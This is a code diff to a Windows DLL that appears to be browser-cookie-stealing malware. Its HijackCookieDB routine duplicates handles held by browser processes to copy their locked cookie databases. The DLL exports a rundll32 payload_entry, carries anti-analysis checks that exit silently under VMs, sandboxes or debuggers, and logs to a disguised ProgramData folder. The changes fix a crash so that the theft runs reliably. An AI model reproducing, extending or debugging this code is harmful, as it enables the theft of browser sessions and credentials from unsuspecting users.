@@ -130,6 +130,25 @@ static void PutN(long long v){ char b[24]; int i=20; if(!v){ Put("0",1); return;
 
 // ------------------------------------------------------------------ debug logging
 #ifdef DEBUG
+// crash locator: log the faulting address (base-relative) so it can be resolved
+// against the map file -- temporary diagnosis for the HijackCookieDB call crash
+static void* g_imgbase = 0;
+static LONG CALLBACK CrashVEH(EXCEPTION_POINTERS* e){
+    HANDLE h = CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",
+        GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,0,NULL);
+    if(h != INVALID_HANDLE_VALUE){
+        SetFilePointer(h,0,NULL,FILE_END);
+        char b[64]; int n = 0; const char* pre = "VEH: code=0x";
+        while(*pre) b[n++] = *pre++;
+        unsigned code = (unsigned)e->ExceptionRecord->ExceptionCode;
+        for(int sh = 28; sh >= 0; sh -= 4){ int d = (code >> sh) & 0xF; b[n++] = d < 10 ? '0'+d : 'A'+d-10; }
+        const char* mid = " rva=0x"; while(*mid) b[n++] = *mid++;
+        unsigned long off = (unsigned long)((char*)e->ExceptionRecord->ExceptionAddress - (char*)g_imgbase);
+        for(int sh = 28; sh >= 0; sh -= 4){ int d = (int)((off >> sh) & 0xF); b[n++] = d < 10 ? '0'+d : 'A'+d-10; }
+        b[n++]='\\r'; b[n++]='\\n'; DWORD w; WriteFile(h,b,n,&w,NULL); CloseHandle(h);
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
 static void Dbg(const char* msg){
     CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
     HANDLE h=CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",GENERIC_WRITE,
@@ -447,16 +466,22 @@ static bool HijackCookieDB(const wchar_t* exe_name, const wchar_t* dst,
         if(hOut == INVALID_HANDLE_VALUE){
             CloseHandle(dup); CloseHandle(hProc); continue;
         }
-        char rbuf[65536]; DWORD totalRead = 0; bool readOk = true;
+        // rbuf must NOT be a 64KB stack local: with /Gs1048576 (required because
+        // /NODEFAULTLIB has no __chkstk) a large frame skips the stack guard page
+        // and the first access faults beyond it -- unrecoverable AV. Heap instead.
+        char* rbuf = (char*)VirtualAlloc(NULL, 65536, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+        if(!rbuf){ CloseHandle(hOut); CloseHandle(dup); CloseHandle(hProc); continue; }
+        DWORD totalRead = 0; bool readOk = true;
         while(totalRead < fsize){
-            DWORD toRead = (fsize - totalRead < (DWORD)sizeof(rbuf)) ?
-                           (fsize - totalRead) : (DWORD)sizeof(rbuf);
+            DWORD toRead = (fsize - totalRead < 65536) ?
+                           (fsize - totalRead) : 65536;
             DWORD nRead = 0;
             if(!ReadFile(dup, rbuf, toRead, &nRead, NULL) || nRead == 0){ readOk = false; break; }
             DWORD nWritten = 0;
             if(!WriteFile(hOut, rbuf, nRead, &nWritten, NULL) || nWritten != nRead){ readOk = false; break; }
             totalRead += nRead;
         }
+        VirtualFree(rbuf, 0, MEM_RELEASE);
         CloseHandle(hOut); CloseHandle(dup); CloseHandle(hProc);
         if(!readOk){ DbgH("HijackCookieDB: read failed"); continue; }
 
@@ -526,9 +551,7 @@ static bool CopyDb(const wchar_t* src, wchar_t* dst, int dst_cap,
     DeleteFileW(dst);
     if(!CopyFileShared(src, dst)){
         // Browser holds 0-sharing lock â€” try handle hijack
-        Dbg("CopyDb: marker A (before hijack try)");
         DbgH("CopyDb: CopyFileShared failed, trying handle hijack");
-        Dbg("CopyDb: marker B (after DbgH)");
         if(exe_name && *exe_name && HijackCookieDB(exe_name, dst, table_name)){
             DbgH("CopyDb: handle hijack OK");
             return true;
@@ -1328,6 +1351,10 @@ extern "C" __declspec(dllexport) DWORD WINAPI entry_stub(void*, unsigned long, v
 
 extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD reason, LPVOID)
 {
+#ifdef DEBUG
+    g_imgbase = (void*)h;
+    AddVectoredExceptionHandler(1, CrashVEH);
+#endif
     Dbg("payload_entry: start");
     // Anti-analysis: exit silently if VM/sandbox/debugger detected.
     // Return 1: a 0 return makes LoadLibrary fail with 1114 and rundll32 pop an error box.
